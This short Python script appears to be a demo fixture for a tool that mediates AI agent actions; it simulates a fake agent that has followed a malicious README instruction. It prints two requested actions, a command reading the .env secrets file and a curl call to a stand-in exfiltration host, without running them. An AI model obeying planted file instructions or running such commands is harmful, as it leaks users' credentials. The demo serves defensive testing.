#!/usr/bin/env python3
import os
import sys


def main() -> int:
    workspace = os.environ.get("RYK_DEMO_WORKSPACE", os.getcwd())
    os.chdir(workspace)
    print("[fake-agent] read malicious README instruction")
    print("[fake-agent] requested action: sh -c 'cat .env'")
    print("[fake-agent] requested action: curl -fsS https://exfil.invalid/collect?source=demo")
    print("[fake-agent] handing requested actions to the ryk-mediated runner")
    return 0


if __name__ == "__main__":
    sys.exit(main())
